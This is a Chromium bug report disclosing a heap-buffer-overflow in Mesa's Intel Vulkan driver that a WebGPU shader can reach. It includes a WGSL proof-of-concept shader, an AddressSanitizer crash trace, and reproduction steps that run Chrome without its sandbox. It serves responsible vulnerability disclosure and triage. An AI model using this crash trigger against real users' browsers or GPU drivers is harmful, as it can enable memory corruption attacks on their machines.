# GPU process crash via WebGPU shader - heap-buffer-overflow in Mesa anv_nir_compute_push_layout

| Field | Value |
|-------|-------|
| **Issue ID** | [421399969](https://issues.chromium.org/issues/421399969) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>WebGPU |
| **Platforms** | Linux, ChromeOS |
| **Reporter** | a7...@gmail.com |
| **Assignee** | ms...@google.com |
| **Created** | 2025-05-31 |
| **Bounty** | $10,000.00 |

## Description

##### VULNERABILITY DETAILS

This report is about a heap-buffer-overflow in Mesa, reachable via WebGPU shaders emitted by dawn/tint. I will also upload this report upstream, i.e., the Mesa project, and post the link below.

##### VERSION

Chrome Version 137.0.7140.0 (Developer Build) (64-bit)   

Operating System: Ubuntu 25.04   

Mesa: mesa-25.1.1, commit 7485541cc3a8a4f60ef66e02265048aadf14b3ed

##### REPRODUCTION CASE

The bug is provoked by compiling the following shader, first with tint to SPIR-V and then later with Mesa:

```
enable subgroups;
diagnostic(off, subgroup_uniformity);

@group(0) @binding(0)
var<storage, read_write> a: f32;

@group(0) @binding(1)
var<uniform> b: f32;

fn c() -> u32 {
    let h = subgroupAnd(u32());
    loop {
        a = b;
        continuing {
            break if false;
        }
    }
    return h;
}

@fragment
fn frag_main() -> @location(0) vec4<f32> {
    let d = c();
    if d == 0 && d == 1 {
        c();
    }
    return vec4<f32>();
}

```

There are two means of reproduction, first the standalone reproduction via gfxrecon-replay. The attached .gfxr allows to reproduce outside of chrome as follows:
`LD_PRELOAD=/usr/lib/llvm-18/lib/clang/18/lib/linux/libclang_rt.asan-x86_64.so VK_DRIVER_FILES=~/src/intel/vulkan/intel_icd.x86_64.json ASAN_OPTIONS=detect_leaks=0,abort_on_error=1 ~/gfxrecon_capture_20250524T100402.gfxr`

Debug builds of mesa trigger the following assert: `assertion ubo_range->block < push_map->block_count ../src/intel/vulkan/anv_nir_compute_push_layout.c 239 anv_nir_compute_push_layout`

Reproducing the issue in Chrome requires an ASAN build of Mesa as well as an ASAN build of Chromium. Note that the issue seems to be in an Intel-specific code path + the device needs to support the subgroups feature. The crash in Chrome has been observed using a Intel BMG G21 device. Opening the attached html file should trigger the UAF in the Chrome GPU process:

```
=================================================================
==34205==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x76cd2de33e00 at pc 0x761d1a4a05ef bp 0x7ffdd40ee720 sp 0x7ffdd40ee718
READ of size 4 at 0x76cd2de33e00 thread T0 (chrome)
    #0 0x761d1a4a05ee in anv_nir_compute_push_layout /home/user/mesa/buildASAN/../src/intel/vulkan/anv_nir_compute_push_layout.c:245:31
    #1 0x761d1a4cd146 in anv_pipeline_lower_nir /home/user/mesa/buildASAN/../src/intel/vulkan/anv_pipeline.c:1111:4
    #2 0x761d1a4d544b in anv_graphics_pipeline_compile /home/user/mesa/buildASAN/../src/intel/vulkan/anv_pipeline.c:2360:7
    #3 0x761d1a4c0f66 in anv_graphics_pipeline_create /home/user/mesa/buildASAN/../src/intel/vulkan/anv_pipeline.c:3264:13
    #4 0x761d1a4c0f66 in anv_CreateGraphicsPipelines /home/user/mesa/buildASAN/../src/intel/vulkan/anv_pipeline.c:3324:16
    #5 0x61493ba8eae4 in dawn::native::vulkan::RenderPipeline::InitializeImpl() third_party/dawn/src/dawn/native/vulkan/RenderPipelineVk.cpp:624:9
    #6 0x61493b82a7a7 in dawn::native::PipelineBase::Initialize(std::__Cr::optional<dawn::native::PerStage<dawn::native::APIRef<dawn::native::ShaderModuleBase>>>) third_party/dawn/src/dawn/native/Pipeline.cpp:383:5
    #7 0x61493b753c09 in dawn::native::DeviceBase::CreateRenderPipeline(dawn::native::RenderPipelineDescriptor const*, bool) third_party/dawn/src/dawn/native/Device.cpp:2092:51
    #8 0x61493b7535fa in dawn::native::DeviceBase::APICreateRenderPipeline(dawn::native::RenderPipelineDescriptor const*) third_party/dawn/src/dawn/native/Device.cpp:1375:26
    #9 0x614957a5e71f in dawn::wire::server::Server::DoDeviceCreateRenderPipeline(WGPUDeviceImpl*, WGPURenderPipelineDescriptor const*, WGPURenderPipelineImpl**) gen/third_party/dawn/src/dawn/wire/server/ServerDoers_autogen.cpp:307:9
    #10 0x614957a5162c in dawn::wire::server::Server::HandleDeviceCreateRenderPipeline(dawn::wire::DeserializeBuffer*) gen/third_party/dawn/src/dawn/wire/server/ServerHandlers_autogen.cpp:595:9
    #11 0x614957a586c7 in dawn::wire::server::Server::HandleCommandsImpl(char const volatile*, unsigned long) gen/third_party/dawn/src/dawn/wire/server/ServerHandlers_autogen.cpp:1674:30
    #12 0x614957a13880 in gpu::webgpu::(anonymous namespace)::DawnWireServer::HandleCommands(char const volatile*, unsigned long) gpu/command_buffer/service/webgpu_decoder_impl.cc:1062:33
    #13 0x614957a13d13 in gpu::webgpu::(anonymous namespace)::WebGPUDecoderImpl::HandleDawnCommands(unsigned int, void const volatile*) gpu/command_buffer/service/webgpu_decoder_impl.cc:2000:22
    #14 0x614957a05e41 in gpu::webgpu::(anonymous namespace)::WebGPUDecoderImpl::DoCommands(unsigned int, void const volatile*, int, int*) gpu/command_buffer/service/webgpu_decoder_impl.cc:1945:18
    #15 0x6149572715a7 in gpu::CommandBufferService::Flush(int, gpu::AsyncAPIInterface*) gpu/command_buffer/service/command_buffer_service.cc:263:35
    #16 0x61495725054b in gpu::CommandBufferStub::OnAsyncFlush(int, unsigned int, std::__Cr::vector<gpu::SyncToken, std::__Cr::allocator<gpu::SyncToken>> const&) gpu/ipc/service/command_buffer_stub.cc:507:22
    #17 0x61495724f71a in gpu::CommandBufferStub::ExecuteDeferredRequest(gpu::mojom::DeferredCommandBufferRequestParams&, gpu::FenceSyncReleaseDelegate*) gpu/ipc/service/command_buffer_stub.cc:163:7
    #18 0x61495727cb0d in gpu::GpuChannel::ExecuteDeferredRequest(mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*) gpu/ipc/service/gpu_channel.cc:958:13
    #19 0x61495728bf17 in void base::internal::DecayedFunctorTraits<void (gpu::GpuChannel::*)(mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*), base::WeakPtr<gpu::GpuChannel>&&, mojo::StructPtr<gpu::mojom::DeferredRequestParams>&&>::Invoke<void (gpu::GpuChannel::*)(mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*), base::WeakPtr<gpu::GpuChannel> const&, mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*>(void (gpu::GpuChannel::*)(mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*), base::WeakPtr<gpu::GpuChannel> const&, mojo::StructPtr<gpu::mojom::DeferredRequestParams>&&, gpu::FenceSyncReleaseDelegate*&&) base/functional/bind_internal.h:731:12
    #20 0x61495728bcff in MakeItSo<void (GpuChannel::*)(mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate *), std::__Cr::tuple<base::WeakPtr<gpu::GpuChannel>, mojo::StructPtr<gpu::mojom::DeferredRequestParams> >, gpu::FenceSyncReleaseDelegate *> base/functional/bind_internal.h:947:5
    #21 0x61495728bcff in RunImpl<void (GpuChannel::*)(mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate *), std::__Cr::tuple<base::WeakPtr<gpu::GpuChannel>, mojo::StructPtr<gpu::mojom::DeferredRequestParams> >, 0UL, 1UL> base/functional/bind_internal.h:1060:14
    #22 0x61495728bcff in base::internal::Invoker<base::internal::FunctorTraits<void (gpu::GpuChannel::*&&)(mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*), base::WeakPtr<gpu::GpuChannel>&&, mojo::StructPtr<gpu::mojom::DeferredRequestParams>&&>, base::internal::BindState<true, true, false, void (gpu::GpuChannel::*)(mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*), base::WeakPtr<gpu::GpuChannel>, mojo::StructPtr<gpu::mojom::DeferredRequestParams>>, void (gpu::FenceSyncReleaseDelegate*)>::RunOnce(base::internal::BindStateBase*, gpu::FenceSyncReleaseDelegate*) base/functional/bind_internal.h:973:12
    #23 0x6149539c6325 in Run base/functional/callback.h:156:12
    #24 0x6149539c6325 in Invoke<base::OnceCallback<void (gpu::FenceSyncReleaseDelegate *)>, gpu::FenceSyncReleaseDelegate *> base/functional/bind_internal.h:806:49
    #25 0x6149539c6325 in MakeItSo<base::OnceCallback<void (gpu::FenceSyncReleaseDelegate *)>, std::__Cr::tuple<base::internal::UnretainedWrapper<gpu::FenceSyncReleaseDelegate, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0> > > base/functional/bind_internal.h:923:12
    #26 0x6149539c6325 in void base::internal::Invoker<base::internal::FunctorTraits<base::OnceCallback<void (gpu::FenceSyncReleaseDelegate*)>&&, gpu::FenceSyncReleaseDelegate*>, base::internal::BindState<false, true, true, base::OnceCallback<void (gpu::FenceSyncReleaseDelegate*)>, base::internal::UnretainedWrapper<gpu::FenceSyncReleaseDelegate, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>>, void ()>::RunImpl<base::OnceCallback<void (gpu::FenceSyncReleaseDelegate*)>, std::__Cr::tuple<base::internal::UnretainedWrapper<gpu::FenceSyncReleaseDelegate, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>>, 0ul>(base::OnceCallback<void (gpu::FenceSyncReleaseDelegate*)>&&, std::__Cr::tuple<base::internal::UnretainedWrapper<gpu::FenceSyncReleaseDelegate, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>>&&, std::__Cr::integer_sequence<unsigned long, 0ul>) base/functional/bind_internal.h:1060:14
    #27 0x6149539a0cec in Run base/functional/callback.h:156:12
    #28 0x6149539a0cec in gpu::Scheduler::ExecuteSequence(base::IdType<gpu::SyncPointOrderData, unsigned int, 0u, 1u>) gpu/command_buffer/service/scheduler.cc:672:29
    #29 0x61495399e94c in gpu::Scheduler::RunNextTask() gpu/command_buffer/service/scheduler.cc:594:3
    #30 0x6149539a2e73 in Invoke<void (Scheduler::*)(), gpu::Scheduler *> base/functional/bind_internal.h:731:12
    #31 0x6149539a2e73 in MakeItSo<void (Scheduler::*)(), std::__Cr::tuple<base::internal::UnretainedWrapper<gpu::Scheduler, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0> > > base/functional/bind_internal.h:923:12
    #32 0x6149539a2e73 in RunImpl<void (Scheduler::*)(), std::__Cr::tuple<base::internal::UnretainedWrapper<gpu::Scheduler, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0> >, 0UL> base/functional/bind_internal.h:1060:14
    #33 0x6149539a2e73 in base::internal::Invoker<base::internal::FunctorTraits<void (gpu::Scheduler::*&&)(), gpu::Scheduler*>, base::internal::BindState<true, true, false, void (gpu::Scheduler::*)(), base::internal::UnretainedWrapper<gpu::Scheduler, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>>, void ()>::RunOnce(base::internal::BindStateBase*) base/functional/bind_internal.h:973:12
    #34 0x61494e0ff746 in Run base/functional/callback.h:156:12
    #35 0x61494e0ff746 in base::TaskAnnotator::RunTaskImpl(base::PendingTask&) base/task/common/task_annotator.cc:209:34
    #36 0x61494e170a48 in RunTask<(lambda at ../../base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:458:11)> base/task/common/task_annotator.h:106:5
    #37 0x61494e170a48 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::LazyNow*) base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:456:23
    #38 0x61494e16f8fc in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork() base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:330:40
    #39 0x61494e17179a in non-virtual thunk to base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork() base/task/sequence_manager/thread_controller_with_message_pump_impl.cc
    #40 0x61494dfc8f33 in base::MessagePumpDefault::Run(base::MessagePump::Delegate*) base/message_loop/message_pump_default.cc:42:55
    #41 0x61494e17234b in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run(bool, base::TimeDelta) base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:629:12
    #42 0x61494e082aaf in base::RunLoop::Run(base::Location const&) base/run_loop.cc:134:14
    #43 0x61496572a381 in content::GpuMain(content::MainFunctionParams) content/gpu/gpu_main.cc:443:14
    #44 0x61494adcc553 in content::RunZygote(content::ContentMainDelegate*) content/app/content_main_runner_impl.cc:686:14
    #45 0x61494adcd4ef in content::RunOtherNamedProcessTypeMain(std::__Cr::basic_string<char, std::__Cr::char_traits<char>, std::__Cr::allocator<char>> const&, content::MainFunctionParams, content::ContentMainDelegate*) content/app/content_main_runner_impl.cc:790:12
    #46 0x61494adcfdc5 in content::ContentMainRunnerImpl::Run() content/app/content_main_runner_impl.cc:1155:10
    #47 0x61494adca2f9 in content::RunContentProcess(content::ContentMainParams, content::ContentMainRunner*) content/app/content_main.cc:359:36
    #48 0x61494adca81b in content::ContentMain(content::ContentMainParams) content/app/content_main.cc:372:10
    #49 0x6149383e2957 in ChromeMain chrome/app/chrome_main.cc:222:12
    #50 0x7a1d2f62a337 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
    #51 0x7a1d2f62a3fa in __libc_start_main csu/../csu/libc-start.c:360:3
    #52 0x614938307029 in _start (/home/user/Downloads/linux-1449920/chrome+0xfb87029) (BuildId: ea1a4345215ab1ef)

0x76cd2de33e00 is located 0 bytes after 112-byte region [0x76cd2de33d90,0x76cd2de33e00)
allocated by thread T0 (chrome) here:
    #0 0x6149383a7234 in malloc /b/s/w/ir/cache/builder/src/third_party/llvm/compiler-rt/lib/asan/asan_malloc_linux.cpp:67:3
    #1 0x761d1ad597e2 in ralloc_size /home/user/mesa/buildASAN/../src/util/ralloc.c:118:18
    #2 0x761d1ad597e2 in rzalloc_size /home/user/mesa/buildASAN/../src/util/ralloc.c:152:16
    #3 0x761d1ad597e2 in rzalloc_array_size /home/user/mesa/buildASAN/../src/util/ralloc.c:232:11
    #4 0x761d1a4881fe in build_packed_binding_table /home/user/mesa/buildASAN/../src/intel/vulkan/anv_nir_apply_pipeline_layout.c:2366:7
    #5 0x761d1a4881fe in anv_nir_apply_pipeline_layout /home/user/mesa/buildASAN/../src/intel/vulkan/anv_nir_apply_pipeline_layout.c:2591:4
    #6 0x761d1a4cc9d0 in anv_pipeline_lower_nir /home/user/mesa/buildASAN/../src/intel/vulkan/anv_pipeline.c:1044:4
    #7 0x761d1a4d544b in anv_graphics_pipeline_compile /home/user/mesa/buildASAN/../src/intel/vulkan/anv_pipeline.c:2360:7
    #8 0x761d1a4c0f66 in anv_graphics_pipeline_create /home/user/mesa/buildASAN/../src/intel/vulkan/anv_pipeline.c:3264:13
    #9 0x761d1a4c0f66 in anv_CreateGraphicsPipelines /home/user/mesa/buildASAN/../src/intel/vulkan/anv_pipeline.c:3324:16
    #10 0x61493ba8eae4 in dawn::native::vulkan::RenderPipeline::InitializeImpl() third_party/dawn/src/dawn/native/vulkan/RenderPipelineVk.cpp:624:9
    #11 0x61493b82a7a7 in dawn::native::PipelineBase::Initialize(std::__Cr::optional<dawn::native::PerStage<dawn::native::APIRef<dawn::native::ShaderModuleBase>>>) third_party/dawn/src/dawn/native/Pipeline.cpp:383:5
    #12 0x61493b753c09 in dawn::native::DeviceBase::CreateRenderPipeline(dawn::native::RenderPipelineDescriptor const*, bool) third_party/dawn/src/dawn/native/Device.cpp:2092:51
    #13 0x61493b7535fa in dawn::native::DeviceBase::APICreateRenderPipeline(dawn::native::RenderPipelineDescriptor const*) third_party/dawn/src/dawn/native/Device.cpp:1375:26
    #14 0x614957a5e71f in dawn::wire::server::Server::DoDeviceCreateRenderPipeline(WGPUDeviceImpl*, WGPURenderPipelineDescriptor const*, WGPURenderPipelineImpl**) gen/third_party/dawn/src/dawn/wire/server/ServerDoers_autogen.cpp:307:9
    #15 0x614957a5162c in dawn::wire::server::Server::HandleDeviceCreateRenderPipeline(dawn::wire::DeserializeBuffer*) gen/third_party/dawn/src/dawn/wire/server/ServerHandlers_autogen.cpp:595:9
    #16 0x614957a586c7 in dawn::wire::server::Server::HandleCommandsImpl(char const volatile*, unsigned long) gen/third_party/dawn/src/dawn/wire/server/ServerHandlers_autogen.cpp:1674:30
    #17 0x614957a13880 in gpu::webgpu::(anonymous namespace)::DawnWireServer::HandleCommands(char const volatile*, unsigned long) gpu/command_buffer/service/webgpu_decoder_impl.cc:1062:33
    #18 0x614957a13d13 in gpu::webgpu::(anonymous namespace)::WebGPUDecoderImpl::HandleDawnCommands(unsigned int, void const volatile*) gpu/command_buffer/service/webgpu_decoder_impl.cc:2000:22
    #19 0x614957a05e41 in gpu::webgpu::(anonymous namespace)::WebGPUDecoderImpl::DoCommands(unsigned int, void const volatile*, int, int*) gpu/command_buffer/service/webgpu_decoder_impl.cc:1945:18
    #20 0x6149572715a7 in gpu::CommandBufferService::Flush(int, gpu::AsyncAPIInterface*) gpu/command_buffer/service/command_buffer_service.cc:263:35
    #21 0x61495725054b in gpu::CommandBufferStub::OnAsyncFlush(int, unsigned int, std::__Cr::vector<gpu::SyncToken, std::__Cr::allocator<gpu::SyncToken>> const&) gpu/ipc/service/command_buffer_stub.cc:507:22
    #22 0x61495724f71a in gpu::CommandBufferStub::ExecuteDeferredRequest(gpu::mojom::DeferredCommandBufferRequestParams&, gpu::FenceSyncReleaseDelegate*) gpu/ipc/service/command_buffer_stub.cc:163:7
    #23 0x61495727cb0d in gpu::GpuChannel::ExecuteDeferredRequest(mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*) gpu/ipc/service/gpu_channel.cc:958:13
    #24 0x61495728bf17 in void base::internal::DecayedFunctorTraits<void (gpu::GpuChannel::*)(mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*), base::WeakPtr<gpu::GpuChannel>&&, mojo::StructPtr<gpu::mojom::DeferredRequestParams>&&>::Invoke<void (gpu::GpuChannel::*)(mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*), base::WeakPtr<gpu::GpuChannel> const&, mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*>(void (gpu::GpuChannel::*)(mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*), base::WeakPtr<gpu::GpuChannel> const&, mojo::StructPtr<gpu::mojom::DeferredRequestParams>&&, gpu::FenceSyncReleaseDelegate*&&) base/functional/bind_internal.h:731:12
    #25 0x61495728bcff in MakeItSo<void (GpuChannel::*)(mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate *), std::__Cr::tuple<base::WeakPtr<gpu::GpuChannel>, mojo::StructPtr<gpu::mojom::DeferredRequestParams> >, gpu::FenceSyncReleaseDelegate *> base/functional/bind_internal.h:947:5
    #26 0x61495728bcff in RunImpl<void (GpuChannel::*)(mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate *), std::__Cr::tuple<base::WeakPtr<gpu::GpuChannel>, mojo::StructPtr<gpu::mojom::DeferredRequestParams> >, 0UL, 1UL> base/functional/bind_internal.h:1060:14
    #27 0x61495728bcff in base::internal::Invoker<base::internal::FunctorTraits<void (gpu::GpuChannel::*&&)(mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*), base::WeakPtr<gpu::GpuChannel>&&, mojo::StructPtr<gpu::mojom::DeferredRequestParams>&&>, base::internal::BindState<true, true, false, void (gpu::GpuChannel::*)(mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*), base::WeakPtr<gpu::GpuChannel>, mojo::StructPtr<gpu::mojom::DeferredRequestParams>>, void (gpu::FenceSyncReleaseDelegate*)>::RunOnce(base::internal::BindStateBase*, gpu::FenceSyncReleaseDelegate*) base/functional/bind_internal.h:973:12
    #28 0x6149539c6325 in Run base/functional/callback.h:156:12
    #29 0x6149539c6325 in Invoke<base::OnceCallback<void (gpu::FenceSyncReleaseDelegate *)>, gpu::FenceSyncReleaseDelegate *> base/functional/bind_internal.h:806:49
    #30 0x6149539c6325 in MakeItSo<base::OnceCallback<void (gpu::FenceSyncReleaseDelegate *)>, std::__Cr::tuple<base::internal::UnretainedWrapper<gpu::FenceSyncReleaseDelegate, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0> > > base/functional/bind_internal.h:923:12
    #31 0x6149539c6325 in void base::internal::Invoker<base::internal::FunctorTraits<base::OnceCallback<void (gpu::FenceSyncReleaseDelegate*)>&&, gpu::FenceSyncReleaseDelegate*>, base::internal::BindState<false, true, true, base::OnceCallback<void (gpu::FenceSyncReleaseDelegate*)>, base::internal::UnretainedWrapper<gpu::FenceSyncReleaseDelegate, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>>, void ()>::RunImpl<base::OnceCallback<void (gpu::FenceSyncReleaseDelegate*)>, std::__Cr::tuple<base::internal::UnretainedWrapper<gpu::FenceSyncReleaseDelegate, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>>, 0ul>(base::OnceCallback<void (gpu::FenceSyncReleaseDelegate*)>&&, std::__Cr::tuple<base::internal::UnretainedWrapper<gpu::FenceSyncReleaseDelegate, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>>&&, std::__Cr::integer_sequence<unsigned long, 0ul>) base/functional/bind_internal.h:1060:14
    #32 0x6149539a0cec in Run base/functional/callback.h:156:12
    #33 0x6149539a0cec in gpu::Scheduler::ExecuteSequence(base::IdType<gpu::SyncPointOrderData, unsigned int, 0u, 1u>) gpu/command_buffer/service/scheduler.cc:672:29
    #34 0x61495399e94c in gpu::Scheduler::RunNextTask() gpu/command_buffer/service/scheduler.cc:594:3
    #35 0x6149539a2e73 in Invoke<void (Scheduler::*)(), gpu::Scheduler *> base/functional/bind_internal.h:731:12
    #36 0x6149539a2e73 in MakeItSo<void (Scheduler::*)(), std::__Cr::tuple<base::internal::UnretainedWrapper<gpu::Scheduler, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0> > > base/functional/bind_internal.h:923:12
    #37 0x6149539a2e73 in RunImpl<void (Scheduler::*)(), std::__Cr::tuple<base::internal::UnretainedWrapper<gpu::Scheduler, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0> >, 0UL> base/functional/bind_internal.h:1060:14
    #38 0x6149539a2e73 in base::internal::Invoker<base::internal::FunctorTraits<void (gpu::Scheduler::*&&)(), gpu::Scheduler*>, base::internal::BindState<true, true, false, void (gpu::Scheduler::*)(), base::internal::UnretainedWrapper<gpu::Scheduler, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>>, void ()>::RunOnce(base::internal::BindStateBase*) base/functional/bind_internal.h:973:12
    #39 0x61494e0ff746 in Run base/functional/callback.h:156:12
    #40 0x61494e0ff746 in base::TaskAnnotator::RunTaskImpl(base::PendingTask&) base/task/common/task_annotator.cc:209:34
    #41 0x61494e170a48 in RunTask<(lambda at ../../base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:458:11)> base/task/common/task_annotator.h:106:5
    #42 0x61494e170a48 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::LazyNow*) base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:456:23
    #43 0x61494e16f8fc in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork() base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:330:40
    #44 0x61494e17179a in non-virtual thunk to base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork() base/task/sequence_manager/thread_controller_with_message_pump_impl.cc

SUMMARY: AddressSanitizer: heap-buffer-overflow /home/user/mesa/buildASAN/../src/intel/vulkan/anv_nir_compute_push_layout.c:245:31 in anv_nir_compute_push_layout
Shadow bytes around the buggy address:
  0x76cd2de33b80: 00 00 00 00 00 00 00 00 00 00 00 00 00 04 fa fa
  0x76cd2de33c00: fa fa fa fa f7 fa 00 00 00 00 00 00 00 00 00 00
  0x76cd2de33c80: 00 00 00 00 fa fa fa fa fa fa f7 fa fa fa fa fa
  0x76cd2de33d00: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x76cd2de33d80: f7 fa 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x76cd2de33e00:[fa]fa fa fa fa fa f7 fa fd fd fd fd fd fd fd fd
  0x76cd2de33e80: fd fd fd fd fd fd fa fa fa fa fa fa f7 fa fd fd
  0x76cd2de33f00: fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa
  0x76cd2de33f80: fa fa f7 fa fd fd fd fd fd fd fd fd fd fd fd fd
  0x76cd2de34000: fd fd fa fa fa fa fa fa f7 fa fd fd fd fd fd fd
  0x76cd2de34080: fd fd fd fd fd fd fd fa fa fa fa fa fa fa f7 fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb

==34205==ADDITIONAL INFO

==34205==Note: Please include this section with the ASan report.
Task trace:
    #0 0x61495399ee99 in gpu::Scheduler::RunNextTask() gpu/command_buffer/service/scheduler.cc:610:27
    #1 0x61495399ee99 in gpu::Scheduler::RunNextTask() gpu/command_buffer/service/scheduler.cc:610:27
    #2 0x61495399aa7d in gpu::Scheduler::TryScheduleSequence(gpu::Scheduler::Sequence*) gpu/command_buffer/service/scheduler.cc:412:29


Command line: `/proc/self/exe --type=gpu-process --no-sandbox --ozone-platform=wayland --use-angle=vulkan --crashpad-handler-pid=34153 --enable-crash-reporter=, --user-data-dir=/tmp/deleteme --change-stack-guard-on-fork=enable --gpu-preferences=UAAAAAAAAAAoAQAEAAAAAAAAAAAAAAAAAADAAAIAAAACAAAAAAAAAAAAAAAGAAAAAAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAEAAAAAAAAAAIAAAAAAAAAAgAAAAAAAAA --shared-files --metrics-shmem-handle=4,i,15330152621371559735,12103847184788705957,262144 --field-trial-handle=3,i,487678817382381512,1029681121896021511,262144 --enable-features=Vulkan --disable-features=EyeDropper --variations-seed-version`

==34205==END OF ADDITIONAL INFO
==34205==ABORTING

```

## Attachments

- gfxrecon_capture_20250524T100402.gfxr (application/octet-stream, 11.4 KB)
- anv_nir_compute_push_layout.html (text/html, 3.3 KB)

## Timeline

### a7...@gmail.com (2025-05-31)

Upstream report at <https://gitlab.freedesktop.org/mesa/mesa/-/issues/13281>

The previous comments states "Opening the attached html file should trigger the UAF in the Chrome GPU process". This is incorrect, it should be a heap OOB and not a UAF.

### th...@chromium.org (2025-06-02)

[security shepherd]
Thanks for the report!

> Reproducing the issue in Chrome requires an ASAN build of Mesa as well as an ASAN build of Chromium. Note that the issue seems to be in an Intel-specific code path + the device needs to support the subgroups feature. The crash in Chrome has been observed using a Intel BMG G21 device. Opening the attached html file should trigger the UAF in the Chrome GPU process:

Reporter: To make this easier for me/others to reproduce, could you kindly:
1. Add step-by-step instructions of how to get an ASAN build of Mesa, and then how to make an ASAN build of Chromium use that ASAN Mesa build?
2. Clarify if there are any special command line flags needed? I see that in https://crbug.com/419939693#comment6 you noted that Linux doesn't enable WebGPU by default -- does that mean some command line flag is needed?
3. Note if you are able to reproduce this on Chrome M136?

In the meantime: Triaging to msturner@ who has been assigned to two other recent similar bugs, and tentatively setting severity as high due to memory corruption in the gpu process. We may need to lower that or possibly add the no-impact label based on https://crbug.com/419939693#comment6 noting that "ChromeOS GPU process is sandboxed and Linux doesn't enable WebGPU by default". Speculatively matching the OS labels from https://crbug.com/384531062.

msturner@: If you are able to reproduce this yourself, could you please note which is the earliest active Chrome milestone that this affects? (M136 or more recent)

### a7...@gmail.com (2025-06-02)

1. `git clone https://chromium.googlesource.com/chromiumos/third_party/mesa; cd mesa; checkout 7485541cc3a8a4f60ef66e02265048aadf14b3ed`
2. `mkdir buildASAN; cd buildASAN`
3. `LLVM_CONFIG=/usr/bin/llvm-config-18 CC=clang-18 CXX=clang++-18 meson .. ; meson configure -Db_sanitize=address -Db_lundef=false -Db_ndebug=true` configure mesa for ASAN
4. `ASAN_OPTIONS=detect_leaks=0 LLVM_CONFIG=/usr/bin/llvm-config-18 ninja src/intel/vulkan/libvulkan_intel.so` build libvulkan\_intel.so
5. `ninja src/intel/vulkan/intel_icd.x86_64.json`
6. inside the json from step 5, update the path s.t. it points to the absolute path of libvulkan\_intel.so from step 4
7. start chrome and run it with the ASAN version of mesa (adapt paths as needed): `ASAN_OPTIONS=external_symbolizer_path=/usr/lib/llvm-18/bin/llvm-symbolizer VK_DRIVER_FILES=/path/to/src/intel/vulkan/intel_icd.x86_64.json ./chrome --user-data-dir=/tmp/deleteme --use-angle=vulkan --enable-features=Vulkan --disable-gpu-watchdog --no-sandbox --enable-unsafe-webgpu`

I'll check whether that also works with M136 tomorrow.

